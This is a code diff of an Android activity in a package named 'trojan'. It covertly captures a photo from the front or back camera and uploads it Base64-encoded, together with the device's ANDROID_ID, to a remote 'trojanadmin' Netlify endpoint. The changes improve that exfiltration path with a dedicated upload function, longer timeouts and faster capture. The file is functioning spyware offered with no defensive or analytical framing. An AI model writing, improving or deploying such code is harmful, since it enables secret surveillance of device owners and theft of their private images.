@@ -2,27 +2,23 @@ package com.trojan;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
-import android.content.ContentValues;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
-import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
-import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.camera.core.CameraSelector;
 import androidx.camera.core.ImageCapture;
 import androidx.camera.core.ImageCaptureException;
-import androidx.camera.core.Preview;
+import androidx.camera.core.ImageProxy;
 import androidx.camera.lifecycle.ProcessCameraProvider;
-import androidx.camera.view.PreviewView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.toolbox.JsonObjectRequest;
@@ -32,16 +28,15 @@ import com.google.common.util.concurrent.ListenableFuture;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
+import java.nio.ByteBuffer;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-// This activity is designed to be invisible to the user.
-// It opens, takes a picture, sends the data, and closes immediately.
 public class CameraActivity extends AppCompatActivity {
     private static final String TAG = "CameraActivity";
     private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
+    // --- NEW: URL for the dedicated file upload function ---
+    private static final String UPLOAD_FILE_URL = "https://trojanadmin.netlify.app/.netlify/functions/upload-file";
     private static final int CAMERA_PERMISSION_REQUEST_CODE = 102;
 
     private ExecutorService cameraExecutor;
@@ -51,22 +46,18 @@ public class CameraActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // We don't need a visible layout for this background task.
-        // setContentView(R.layout.activity_camera);
-
         cameraExecutor = Executors.newSingleThreadExecutor();
         requestQueue = Volley.newRequestQueue(this);
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
             startCameraAndCapture();
         } else {
-            // This is a fallback. Permissions should be granted from MainActivity.
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST_CODE);
         }
     }
 
     private void startCameraAndCapture() {
-        int cameraId = getIntent().getIntExtra("camera_id", 0); // 0 for back, 1 for front
+        int cameraId = getIntent().getIntExtra("camera_id", 0);
         int cameraSelectorId = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
         CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(cameraSelectorId).build();
 
@@ -75,19 +66,13 @@ public class CameraActivity extends AppCompatActivity {
         cameraProviderFuture.addListener(() -> {
             try {
                 ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
-
-                imageCapture = new ImageCapture.Builder().build();
-
-                // Bind the lifecycle. Since this activity has no preview, we don't bind a Preview use case.
+                imageCapture = new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
                 cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
-
-                // Now that the camera is ready, take the picture.
                 takePictureAndSubmit();
-
             } catch (Exception e) {
                 Log.e(TAG, "CameraX initialization failed", e);
                 submitDataToServer("picture_error", "Camera init failed: " + e.getMessage());
-                finish(); // Close the activity on failure
+                finish();
             }
         }, ContextCompat.getMainExecutor(this));
     }
@@ -99,31 +84,27 @@ public class CameraActivity extends AppCompatActivity {
             return;
         }
 
-        ImageCapture.OutputFileOptions outputFileOptions = new ImageCapture.OutputFileOptions.Builder(
-                getContentResolver(),
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                new ContentValues()
-        ).build();
-
         imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
+            @SuppressLint("UnsafeOptInUsageError")
             @Override
-            public void onCaptureSuccess(@NonNull androidx.camera.core.ImageProxy image) {
+            public void onCaptureSuccess(@NonNull ImageProxy image) {
                 super.onCaptureSuccess(image);
                 try {
-                    // Convert the image to a Base64 string
-                    @SuppressLint("UnsafeOptInUsageError")
-                    InputStream inputStream = new InputSource(image.getImage()).getInputStream();
-                    byte[] bytes = getBytes(inputStream);
+                    // Convert the captured image to a Base64 string
+                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buffer.remaining()];
+                    buffer.get(bytes);
                     String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);
 
-                    submitDataToServer("picture", encodedImage);
+                    // --- UPGRADED: Use the new dedicated function for file uploads ---
+                    uploadBase64File("picture", encodedImage);
 
                 } catch (Exception e) {
                     Log.e(TAG, "Failed to process captured image", e);
                     submitDataToServer("picture_error", "Image processing failed.");
                 } finally {
                     image.close();
-                    finish(); // Ensure activity closes after capture
+                    finish();
                 }
             }
 
@@ -131,11 +112,41 @@ public class CameraActivity extends AppCompatActivity {
             public void onError(@NonNull ImageCaptureException exception) {
                 Log.e(TAG, "Image capture failed: " + exception.getMessage(), exception);
                 submitDataToServer("picture_error", "Capture failed: " + exception.getMessage());
-                finish(); // Close activity on error
+                finish();
             }
         });
     }
 
+    // --- NEW: Method to upload large Base64 files to the new Netlify function ---
+    private void uploadBase64File(String dataType, String base64Data) {
+        JSONObject postData = new JSONObject();
+        try {
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            postData.put("deviceId", deviceId);
+            postData.put("dataType", dataType);
+            postData.put("fileData", base64Data);
+        } catch (JSONException e) {
+            Log.e(TAG, "Could not create file upload JSON", e);
+            finish(); // Finish activity if we can't even create the request
+            return;
+        }
+
+        Log.d(TAG, "Uploading Base64 data for type: " + dataType);
+        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
+                response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
+                error -> Log.e(TAG, "Failed to submit Base64 data '" + dataType + "': " + error.toString())
+        );
+        
+        // Increase the timeout for large image data
+        request.setRetryPolicy(new DefaultRetryPolicy(
+                30000, // 30 seconds
+                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
+
+        requestQueue.add(request);
+    }
+
+    // This method is now only used for sending small error messages
     private void submitDataToServer(String dataType, String payload) {
         JSONObject postData = new JSONObject();
         try {
@@ -148,40 +159,11 @@ public class CameraActivity extends AppCompatActivity {
             return;
         }
         JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
-                response -> Log.i(TAG, "Data submitted successfully: " + dataType),
-                error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
+                response -> Log.i(TAG, "Error data submitted successfully: " + dataType),
+                error -> Log.e(TAG, "Failed to submit error data '" + dataType + "': " + error.toString())
         );
         requestQueue.add(request);
     }
-
-    // Helper to convert InputStream to byte array
-    private byte[] getBytes(InputStream inputStream) throws Exception {
-        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
-        int bufferSize = 1024;
-        byte[] buffer = new byte[bufferSize];
-        int len;
-        while ((len = inputStream.read(buffer)) != -1) {
-            byteBuffer.write(buffer, 0, len);
-        }
-        return byteBuffer.toByteArray();
-    }
-    
-    // A helper class to get an InputStream from an ImageProxy
-    private static class InputSource {
-        private final android.media.Image image;
-        public InputSource(android.media.Image image) {
-            this.image = image;
-        }
-        public InputStream getInputStream() {
-            // Simplified logic; assumes JPEG format
-            android.media.Image.Plane[] planes = image.getPlanes();
-            java.nio.ByteBuffer buffer = planes[0].getBuffer();
-            byte[] bytes = new byte[buffer.remaining()];
-            buffer.get(bytes);
-            return new java.io.ByteArrayInputStream(bytes);
-        }
-    }
-
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
@@ -191,7 +173,7 @@ public class CameraActivity extends AppCompatActivity {
                 startCameraAndCapture();
             } else {
                 submitDataToServer("picture_error", "Camera permission denied.");
-                finish(); // Close if permission is denied
+                finish();
             }
         }
     }
@@ -199,6 +181,8 @@ public class CameraActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        cameraExecutor.shutdown();
+        if (cameraExecutor != null) {
+            cameraExecutor.shutdown();
+        }
     }
 }
